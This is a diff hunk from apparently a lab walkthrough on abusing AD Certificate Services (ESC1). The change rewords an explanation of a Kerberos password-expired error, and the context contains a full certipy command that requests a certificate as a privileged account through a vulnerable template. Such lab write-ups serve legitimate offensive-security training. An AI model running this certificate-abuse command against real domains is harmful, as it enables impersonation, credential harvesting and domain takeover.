@@ -342,7 +342,7 @@ The CertSvc service may need to be restarted for changes to take effect.
 
 2. TGT: Kerberos SessionError: KDC_ERR_KEY_EXPIRED(Password has expired; change password to reset)
 
-Meaning - The DA account password has not been set to never expire and has expired requiring it to be changed before an NTLM hash can be harvested.
+Meaning - The DA accounts password has not been configured to never expire, it has expired requiring it to be changed before an NTLM hash can be harvested.
 
 ```
 (Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy req -u g.white -k -no-pass -ca 'hacklab-WIN-8HPLF8PSHC1-CA' -target 'WIN-8HPLF8PSHC1.hacklab.local' -template ESC1-Vun1 -dc-ip 192.168.68.230 -ptt -upn 'svc_admin@hacklab.local' -debug
